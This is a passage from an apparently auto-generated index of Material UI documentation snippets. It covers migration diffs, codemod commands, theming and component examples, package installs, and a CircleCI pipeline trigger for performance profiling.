https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v4-is-out.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { StylesProvider } from '@mui/styles';\\n\\n<StylesProvider injectFirst>\\n  {/* Your component tree.\\n      Styled components can override Material UI's styles. */}\\n</StylesProvider>;\n```\n\n----------------------------------------\n\nTITLE: Renaming Switch Component Classes\nDESCRIPTION: Class name changes for Switch component to match specification wording.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_17\n\nLANGUAGE: diff\nCODE:\n```\n-icon\n-bar\n+thumb\n+track\n```\n\n----------------------------------------\n\nTITLE: Optimizing Linear Progress Bar Transitions in CSS\nDESCRIPTION: CSS snippet to disable transition animations on LinearProgress component for high-frequency updates (30+ renders per second).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/progress/progress.md#2025-04-22_snippet_1\n\nLANGUAGE: css\nCODE:\n```\n.MuiLinearProgress-bar {\n  transition: none;\n}\n```\n\n----------------------------------------\n\nTITLE: Material UI Figma Version Comparison Table\nDESCRIPTION: Markdown table comparing features between Community and Full versions of Material UI for Figma\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/design-resources/material-ui-for-figma/material-ui-for-figma.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n|                                   | Community | Full version |\n| :-------------------------------- | --------: | -----------: |\n| Components without customizations |       All |          All |\n| Components with customizations    |         4 |          All |\n| Figma variables                   |         - |           ✅ |\n```\n\n----------------------------------------\n\nTITLE: Fixing Ref Type Specificity for Material UI Components\nDESCRIPTION: Example showing how to fix type errors by specifying correct element types for refs when working with Material UI components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_7\n\nLANGUAGE: diff\nCODE:\n```\n import * as React from 'react';\n import Card from '@mui/material/Card';\n import ListItem from '@mui/material/ListItem';\n\n export default function SpecificRefType() {\n-  const cardRef = React.useRef<HTMLElement>(null);\n+  const cardRef = React.useRef<HTMLDivElement>(null);\n\n-  const listItemRef = React.useRef<HTMLElement>(null);\n+  const listItemRef = React.useRef<HTMLLIElement>(null);\n   return (\n     <div>\n       <Card ref={cardRef}></Card>\n       <ListItem ref={listItemRef}></ListItem>\n     </div>\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Updating Drawer Classes for Proper Selector Hierarchy\nDESCRIPTION: Transforms Drawer component class selectors to use a proper parent-child relationship in styling. Changes paperAnchor* classes to use the anchor* and paper classes with appropriate relationship selectors.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_27\n\nLANGUAGE: diff\nCODE:\n```\n import { drawerClasses } from '@mui/material/Drawer';\n\n MuiDrawer: {\n   styleOverrides: {\n     root: {\n-      [`.${drawerClasses.paperAnchorBottom}`]: {\n+      [`&.${drawerClasses.anchorBottom} > .${drawerClasses.paper}`]: {\n         color: 'red',\n       },\n-      [`.${drawerClasses.paperAnchorLeft}`]: {\n+      [`&.${drawerClasses.anchorLeft} > .${drawerClasses.paper}`]: {\n         color: 'red',\n       },\n-      [`.${drawerClasses.paperAnchorRight}`]: {\n+      [`&.${drawerClasses.anchorRight} > .${drawerClasses.paper}`]: {\n         color: 'red',\n       },\n-      [`.${drawerClasses.paperAnchorTop}`]: {\n+      [`&.${drawerClasses.anchorTop} > .${drawerClasses.paper}`]: {\n         color: 'red',\n       },\n-      [`.${drawerClasses.paperAnchorDockedBottom}`]: {\n+      [`&.${drawerClasses.docked}.${drawerClasses.anchorBottom} > .${drawerClasses.paper}`]: {\n         color: 'red',\n       },\n-      [`.${drawerClasses.paperAnchorDockedLeft}`]: {\n+      [`&.${drawerClasses.docked}.${drawerClasses.anchorLeft} > .${drawerClasses.paper}`]: {\n         color: 'red',\n       },\n-      [`.${drawerClasses.paperAnchorDockedRight}`]: {\n+      [`&.${drawerClasses.docked}.${drawerClasses.anchorRight} > .${drawerClasses.paper}`]: {\n         color: 'red',\n       },\n-      [`.${drawerClasses.paperAnchorDockedTop}`]: {\n+      [`&.${drawerClasses.docked}.${drawerClasses.anchorTop} > .${drawerClasses.paper}`]: {\n         color: 'red',\n       },\n     },\n   },\n },\n```\n\n----------------------------------------\n\nTITLE: Converting Theme Palette Type to Mode\nDESCRIPTION: Renames the theme palette 'type' property to 'mode' for dark/light mode configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_116\n\nLANGUAGE: diff\nCODE:\n```\n {\n   palette: {\n-    type: 'dark',\n+    mode: 'dark',\n   },\n }\n```\n\n----------------------------------------\n\nTITLE: Importing useAutocomplete Hook from MUI Base\nDESCRIPTION: Shows how to import the useAutocomplete hook from the unstyled components package @mui/base. This is part of the headless component approach introduced in v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q3-update.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { useAutocomplete } from '@mui/base/AutocompleteUnstyled';\n```\n\n----------------------------------------\n\nTITLE: Running styled Codemod for Migrating Styled Components\nDESCRIPTION: This snippet shows the command to run the codemod for migrating styled components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_20\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/styled path/to/folder\n```\n\n----------------------------------------\n\nTITLE: Migrating Backdrop Component Props in Theme Configuration\nDESCRIPTION: Shows how to update the theme defaultProps for Backdrop component from deprecated 'components/componentsProps' pattern to the newer 'slots/slotProps' approach.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n MuiBackdrop: {\n   defaultProps: {\n-    components: { Root: CustomRoot }\n-    componentsProps: { root: { testid: 'root-id' } }\n+    slots: { root: CustomRoot },\n+    slotProps: { root: { testid: 'root-id' } },\n  },\n },\n```\n\n----------------------------------------\n\nTITLE: Updating Switch CSS classes in HTML\nDESCRIPTION: Updates the CSS classes for the Switch component, removing .MuiIconButton-root and .MuiIconButton-label, and targeting .MuiButtonBase-root instead.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_28\n\nLANGUAGE: diff\nCODE:\n```\n  <span class=\"MuiSwitch-root\">\n-  <span class=\"MuiIconButton-root MuiButtonBase-root MuiSwitch-switchBase PrivateSwitchBase-root\">\n-    <span class=\"MuiIconButton-label\">\n-      <input class=\"MuiSwitch-input PrivateSwitchBase-input\">\n+  <span class=\"MuiButtonBase-root MuiSwitch-switchBase PrivateSwitchBase-root\">\n+    <span class=\"MuiSwitch-input PrivateSwitchBase-input\">\n```\n\n----------------------------------------\n\nTITLE: Basic Switch Component Implementation\nDESCRIPTION: Basic setup for using the Switch component from Joy UI after installation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/switch/switch.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Switch from '@mui/joy/Switch';\n\nexport default function MyApp() {\n  return <Switch />;\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating ListItem Props to Slots API\nDESCRIPTION: Transforms ListItem component from using the deprecated components/componentsProps API to the new slots/slotProps API pattern.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_36\n\nLANGUAGE: diff\nCODE:\n```\n <ListItem\n-  components={{ Root: CustomRoot }}\n-  componentsProps={{ root: { testid: 'test-id' } }}\n+  slots={{ root: CustomRoot }}\n+  slotProps={{ root: { testid: 'test-id' } }}\n />\n```\n\n----------------------------------------\n\nTITLE: Using String-based Padding Values with Units in Emotion\nDESCRIPTION: Example of the correct way to specify padding values with units using string-based syntax with Emotion instead of JSS array-based syntax.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\nconst theme = createTheme({\n  components: {\n    MuiOutlinedInput: {\n      styleOverrides: {\n        root: {\n          padding: '5px 8px 6px',\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Running CircularProgress Classes Codemod Command\nDESCRIPTION: Command to automatically update deprecated CircularProgress class names in a codebase using MUI's codemod tool.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_21\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/circular-progress-classes <path>\n```\n\n----------------------------------------\n\nTITLE: Theme Configuration for Typography Level Mapping\nDESCRIPTION: Configuration to customize HTML element mapping for different typography levels in the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/typography/typography.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nconst theme = extendTheme({\n  components: {\n    JoyTypography: {\n      defaultProps: {\n        levelMapping: {\n          h1: 'h2',\n          h2: 'h2',\n          h3: 'h3',\n          h4: 'h3',\n          'title-lg': 'p',\n          'title-md': 'p',\n          'title-sm': 'p',\n          'body-md': 'p',\n          'body-sm': 'p',\n          'body-xs': 'span',\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Merging Slot Props with Custom Tooltip in TypeScript\nDESCRIPTION: Shows how to use mergeSlotProps utility to combine custom props with slot props while handling special cases for className, style, and event handlers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/composition/composition.md#2025-04-22_snippet_1\n\nLANGUAGE: tsx\nCODE:\n```\nimport Tooltip, { TooltipProps } from '@mui/material/Tooltip';\nimport { mergeSlotProps } from '@mui/material/utils';\n\nexport const CustomTooltip = (props: TooltipProps) => {\n  const { children, title, sx: sxProps } = props;\n\n  return (\n    <Tooltip\n      {...props}\n      title={<Box sx={{ p: 4 }}>{title}</Box>}\n      slotProps={{\n        ...props.slotProps,\n        popper: mergeSlotProps(props.slotProps?.popper, {\n          className: 'custom-tooltip-popper',\n          disablePortal: true,\n          placement: 'top',\n        }),\n      }}\n    >\n      {children}\n    </Tooltip>\n  );\n};\n```\n\n----------------------------------------\n\nTITLE: TypeScript Interface Extension for Material UI Button Props\nDESCRIPTION: This TypeScript snippet shows how to extend the ButtonPropsVariantOverrides interface to add custom variants to the Button component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/callback-support-in-style-overrides.md#2025-04-22_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\ndeclare module '@mui/material/Button' {\n  interface ButtonPropsVariantOverrides {\n    dashed: true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Enhanced Transfer List Demo Reference\nDESCRIPTION: Reference to an enhanced transfer list implementation featuring a select all/none checkbox and item counter functionality.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/transfer-list/transfer-list.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n{\"demo\": \"SelectAllTransferList.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Migrating ListItemText Typography Props to SlotProps\nDESCRIPTION: Transforms ListItemText component from using primaryTypographyProps and secondaryTypographyProps to the new slotProps API.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_39\n\nLANGUAGE: diff\nCODE:\n```\n <ListItemText\n-  primaryTypographyProps={primaryTypographyProps}\n+  slotProps={{ primary: primaryTypographyProps }}\n-  secondaryTypographyProps={secondaryTypographyProps}\n+  slotProps={{ secondary: secondaryTypographyProps }}\n />\n```\n\n----------------------------------------\n\nTITLE: Incorrect Usage of Joy UI Button in Next.js Server Component\nDESCRIPTION: This code snippet illustrates an incorrect way of using a Joy UI Button component in a Next.js server component. The onClick handler is non-serializable, which causes issues with server-side rendering.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/integrations/next-js-app-router/next-js-app-router.md#2025-04-22_snippet_2\n\nLANGUAGE: tsx\nCODE:\n```\n// app/page.tsx\nimport Button from '@mui/joy/Button';\nimport Sheet from '@mui/joy/Sheet';\n\nexport default function Page() {\n  return (\n    <Sheet>\n      {/* Next.js won't render this button without 'use-client' */}\n      <Button\n        onClick={() => {\n          console.log('handle click');\n        }}\n      >\n        Submit\n      </Button>\n    </Sheet>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Switch onChange handler in React TypeScript\nDESCRIPTION: Modifies the onChange handler of the Switch component to remove the deprecated second argument and access the checked state from event.target.checked.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_26\n\nLANGUAGE: diff\nCODE:\n```\n function MySwitch() {\n-  const handleChange = (event: React.ChangeEvent<HTMLInputElement>, checked: boolean) => {\n+  const handleChange = (event: React.ChangeEvent<HTMLInputElement>) => {\n+    const checked = event.target.checked;\n   };\n\n   return <Switch onChange={handleChange} />;\n }\n```\n\n----------------------------------------\n\nTITLE: MUI System Grid Import Statement\nDESCRIPTION: Shows how to import grid functionality from MUI System.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/grid/grid.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nimport { grid } from '@mui/system';\n```\n\n----------------------------------------\n\nTITLE: Type Casting for styled Box Components in Material UI v6\nDESCRIPTION: Alternative approach to handle Box component type issues with styled by casting the result to the Box type.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_22\n\nLANGUAGE: diff\nCODE:\n```\n const StyledBox = styled(Box)`\n   color: white;\n-`;\n+` as typeof Box;\n```\n\n----------------------------------------\n\nTITLE: FilledInput Props Codemod Command\nDESCRIPTION: Bash command to automatically transform deprecated FilledInput component props using MUI's codemod utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_32\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/filled-input-props <path>\n```\n\n----------------------------------------\n\nTITLE: Importing Card Layer Components\nDESCRIPTION: Import statements for CardCover and CardContent, which are used to create multiple layers in a Card where CardCover can display background images or gradients beneath CardContent.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/card/card.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport CardCover from '@mui/joy/CardCover';\nimport CardContent from '@mui/joy/CardContent';\n```\n\n----------------------------------------\n\nTITLE: Triggering CircleCI Pipeline for Performance Profiling in Material-UI\nDESCRIPTION: This bash command triggers a CircleCI pipeline to run performance profiling for a specific pull request in the Material-UI project. It requires a CircleCI personal access token and the pull request number.\nSOURCE: https://github.com/mui/material-ui/blob/master/test/README.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n  --url https://circleci.com/api/v2/project/gh/mui/material-ui/pipeline \\\n  --header 'content-type: application/json' \\\n  --header 'Circle-Token: $CIRCLE_TOKEN' \\\n  --data-raw '{\"branch\":\"pull/24289/head\",\"parameters\":{\"workflow\":\"profile\"}}'\n```\n\n----------------------------------------\n\nTITLE: Defining Global Styles\nDESCRIPTION: Example of defining global styles using the globalCss API.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nimport { globalCss } from '@pigment-css/react';\n\nglobalCss`\n  body {\n    margin: 0;\n    padding: 0;\n  }\n`;\n```\n\n----------------------------------------\n\nTITLE: Applying Additive Borders with Material-UI Box Component\nDESCRIPTION: Examples of adding borders to elements using the Box component with the sx prop. Shows how to add all borders or specific borders (top, right, bottom, left).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/borders/borders.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ border: 1 }}>…\n<Box sx={{ borderTop: 1 }}>…\n<Box sx={{ borderRight: 1 }}>…\n<Box sx={{ borderBottom: 1 }}>…\n<Box sx={{ borderLeft: 1 }}>…\n```\n\n----------------------------------------\n\nTITLE: Defining TypeScript Interface for Autocomplete Options\nDESCRIPTION: TypeScript interface defining the structure of options that can be used with the Autocomplete component. Supports both object with label property and simple string options.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/autocomplete/autocomplete.md#2025-04-22_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface AutocompleteOption {\n  label: string;\n}\n// or\ntype AutocompleteOption = string;\n```\n\n----------------------------------------\n\nTITLE: Updating ListItem Theme Default Props\nDESCRIPTION: Updates MuiListItem theme configuration to use the new slots/slotProps API instead of components/componentsProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_37\n\nLANGUAGE: diff\nCODE:\n```\n MuiListItem: {\n   defaultProps: {\n-    components: { Root: CustomRoot }\n-    componentsProps: { root: { testid: 'test-id' }}\n+    slots: { root: CustomRoot },\n+    slotProps: { root: { testid: 'test-id' } },\n  },\n },\n```\n\n----------------------------------------\n\nTITLE: Importing ModalClose Component in Joy UI\nDESCRIPTION: Import statement for the ModalClose component which adds a close button to the Drawer.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/drawer/drawer.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport ModalClose from '@mui/joy/ModalClose';\n```\n\n----------------------------------------\n\nTITLE: Using Radio Group Hook\nDESCRIPTION: Example of using the useRadioGroup hook for advanced customization of radio group components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/radio-buttons/radio-buttons.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { useRadioGroup } from '@mui/material/RadioGroup';\n```\n\n----------------------------------------\n\nTITLE: Setting List Component to Use Ordered List Element\nDESCRIPTION: Example of using the component prop to change the semantic HTML element rendered by the List component from the default ul to ol.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/list/list.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n<List component=\"ol\">\n```\n\n----------------------------------------\n\nTITLE: Installing Material-UI v0.x and v1.x Side by Side with NPM\nDESCRIPTION: Shows how to install both Material-UI versions simultaneously using NPM package manager to facilitate a gradual migration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install material-ui\nnpm install @material-ui/core\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI and Emotion using npm (Bash)\nDESCRIPTION: This command installs the `@mui/material`, `@emotion/react`, and `@emotion/styled` packages using the npm package manager. `@emotion/react` and `@emotion/styled` are required peer dependencies for Material UI. This snippet is presented within a tabbed `codeblock` component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/codeblock.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n```bash npm\nnpm install @mui/material @emotion/react @emotion/styled\n# `@emotion/react` and `@emotion/styled` are peer dependencies\n```\n```\n\n----------------------------------------\n\nTITLE: Updating SVG icon imports for Material UI v1.0.0\nDESCRIPTION: This codemod updates SVG icon import paths to use the new @material-ui/icons package structure in v1.0.0.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_126\n\nLANGUAGE: diff\nCODE:\n```\n-import AccessAlarmIcon from 'material-ui/svg-icons/device/AccessAlarm';\n-import ThreeDRotation from 'material-ui/svg-icons/action/ThreeDRotation';\n+import AccessAlarmIcon from '@material-ui/icons/AccessAlarm';\n+import ThreeDRotation from '@material-ui/icons/ThreeDRotation';\n```\n\n----------------------------------------\n\nTITLE: Pagination Round to Circular Codemod Example\nDESCRIPTION: This codemod renames Pagination and PaginationItem's shape values from 'round' to 'circular' to match the API changes in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_102\n\nLANGUAGE: diff\nCODE:\n```\n-<Pagination shape=\"round\" />\n-<PaginationItem shape=\"round\" />\n+<Pagination shape=\"circular\" />\n+<PaginationItem shape=\"circular\" />\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Material UI CRA TypeScript Example\nDESCRIPTION: Commands to install dependencies and start the development server for the Material UI Create React App TypeScript example.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Updating styled Import and Usage\nDESCRIPTION: Diff showing the changes to import styled from @mui/styles instead of @mui/material/styles and adding ThemeProvider for theme context.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_31\n\nLANGUAGE: diff\nCODE:\n```\n-import { styled } from '@mui/material/styles';\n+import { styled } from '@mui/styles';\n+import { createTheme, ThemeProvider } from '@mui/material/styles';\n\n+const theme = createTheme();\n  const MyComponent = styled('div')(({ theme }) => ({ background: theme.palette.primary.main }));\n\n  function App(props) {\n-  return <MyComponent />;\n+  return <ThemeProvider theme={theme}><MyComponent {...props} /></ThemeProvider>;\n  }\n```\n\n----------------------------------------\n\nTITLE: Removing Borders with Material-UI Box Component\nDESCRIPTION: Examples of removing borders from elements using the Box component with the sx prop. Shows how to remove all borders or specific borders (top, right, bottom, left).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/borders/borders.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ border: 0 }}>…\n<Box sx={{ borderTop: 0 }}>…\n<Box sx={{ borderRight: 0 }}>…\n<Box sx={{ borderBottom: 0 }}>…\n<Box sx={{ borderLeft: 0 }}>…\n```\n\n----------------------------------------\n\nTITLE: Testing Pigment CSS Theme Types with TypeScript\nDESCRIPTION: TypeScript code to verify that the theme types are correctly picked up by Pigment CSS with a styled component example.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_12\n\nLANGUAGE: ts\nCODE:\n```\n// e.g. App.tsx\nimport { styled } from '@mui/material-pigment-css';\n\nconst TestThemeTypes = styled('div')(({ theme }) => ({\n  color: theme.palette.primary.main,\n}));\n```\n\n----------------------------------------\n\nTITLE: Importing Snackbar Component in React\nDESCRIPTION: Basic import statement for the Material-UI Snackbar component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/snackbars/snackbars.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Snackbar from '@mui/material/Snackbar';\n```\n\n----------------------------------------\n\nTITLE: Updating Slider Import Path\nDESCRIPTION: Migration step for importing Slider component from core instead of lab package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_16\n\nLANGUAGE: diff\nCODE:\n```\n-import Slider from '@material-ui/lab/Slider'\n+import Slider from '@material-ui/core/Slider'\n```\n\n----------------------------------------\n\nTITLE: Augmenting DefaultTheme in JavaScript for Material UI v5\nDESCRIPTION: Creates a type definition file to fix IDE type inference for JavaScript projects using Material UI v5 with @mui/styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/troubleshooting.md#2025-04-22_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n// index.d.ts\ndeclare module '@mui/private-theming' {\n  import type { Theme } from '@mui/material/styles';\n\n  interface DefaultTheme extends Theme {}\n}\n```\n\n----------------------------------------\n\nTITLE: Updating ImageListItemBar Classes for Proper Selector Hierarchy\nDESCRIPTION: Transforms ImageListItemBar component class selectors to use proper parent-child relationships in styling. Updates class structure for position and action components.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_42\n\nLANGUAGE: diff\nCODE:\n```\n import { imageListItemBarClasses } from '@mui/material/ImageListItemBar';\n\n MuiImageListItemBar: {\n   styleOverrides: {\n     root: {\n-      [`& .${imageListItemBarClasses.titleWrapBelow}`]: {\n+      [`&.${imageListItemBarClasses.positionBelow} > .${imageListItemBarClasses.titleWrap}`]: {\n         color: 'red',\n       },\n-      [`& .${imageListItemBarClasses.titleWrapActionPosLeft}`]: {\n+      [`&.${imageListItemBarClasses.actionPositionLeft} > .${imageListItemBarClasses.titleWrap}`]: {\n         color: 'red',\n       },\n-      [`& .${imageListItemBarClasses.titleWrapActionPosRight}`]: {\n+      [`&.${imageListItemBarClasses.actionPositionRight} > .${imageListItemBarClasses.titleWrap}`]: {\n         color: 'red',\n       },\n-      [`& .${imageListItemBarClasses.actionIconActionPosLeft}`]: {\n+      [`&.${imageListItemBarClasses.actionPositionLeft} > .${imageListItemBarClasses.actionIcon}`]: {\n         color: 'red',\n       },\n     },\n   },\n },\n```\n\n----------------------------------------\n\nTITLE: Box Component HTML Structure\nDESCRIPTION: The basic HTML structure showing how the Box component is rendered in the DOM.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/box/box.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<div className=\"MuiBox-root\">\n  <!-- contents of the Box -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Applying Custom CSS Class to MUI Switch (JSX)\nDESCRIPTION: This snippet demonstrates applying a custom CSS class named 'uglySwitch' to a Material UI `Switch` component. This class is used to target the component and its sub-elements for custom styling via CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/making-customizable-components.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Switch className=\"uglySwitch\" />\n```\n\n----------------------------------------\n\nTITLE: Setting Grid Gap Using Theme Spacing with sx Prop in Material UI JSX\nDESCRIPTION: Shows how CSS Grid properties `gap`, `rowGap`, and `columnGap` within the `sx` prop use theme spacing. The provided numeric value is multiplied by the `theme.spacing` unit (default 8px) to determine the final gap size.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ gap: 2 }} />\n// equivalent to gap: theme => theme.spacing(2)\n```\n\n----------------------------------------\n\nTITLE: Configuring getInitColorSchemeScript Options in JavaScript\nDESCRIPTION: This snippet shows the options object for the getInitColorSchemeScript function, which is used to initialize the color scheme before React renders.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/experimental-api/css-theme-variables/css-theme-variables.md#2025-04-22_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  defaultMode: 'light' | 'dark' | 'system',\n  modeStorageKey: string,\n  attribute: string\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Joy UI and Dependencies\nDESCRIPTION: Command to install Joy UI and its required Emotion dependencies via npm package manager. These packages are necessary to use Joy UI components in a React project.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-joy/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/joy @emotion/react @emotion/styled\n```\n\n----------------------------------------\n\nTITLE: Extending Component Colors in Joy UI\nDESCRIPTION: Shows how to add custom colors to a component beyond the built-in color options. This example adds a 'secondary' color option to Button components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyButton: {\n      styleOverrides: {\n        root: ({ ownerState, theme }) => ({\n          ...(ownerState.color === 'secondary' && {\n            color: theme.vars.palette.text.secondary,\n            backgroundColor: theme.vars.palette.background.level1,\n          }),\n        }),\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Installing Material Icons with pnpm\nDESCRIPTION: Command to install @mui/icons-material and its dependencies using pnpm package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/material-icons/material-icons.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/icons-material @mui/material @emotion/styled @emotion/react\n```\n\n----------------------------------------\n\nTITLE: Updating withTheme API Usage\nDESCRIPTION: Diff showing the simplified withTheme() function usage which no longer requires an empty first argument in v4.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n-const DeepChild = withTheme()(DeepChildRaw);\n+const DeepChild = withTheme(DeepChildRaw);\n```\n\n----------------------------------------\n\nTITLE: ListItem Props Codemod Command\nDESCRIPTION: Bash command to automatically transform deprecated ListItem component props using MUI's codemod utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_38\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/list-item-props <path>\n```\n\n----------------------------------------\n\nTITLE: HTML Structure of Circular Progress Component\nDESCRIPTION: Displays the underlying HTML structure of the Circular Progress component, including the root span, SVG element, and circles for track and progress.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/circular-progress/circular-progress.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<span role=\"progressbar\" class=\"MuiCircularProgress-root\">\n  <svg class=\"MuiCircularProgress-svg\">\n    <circle 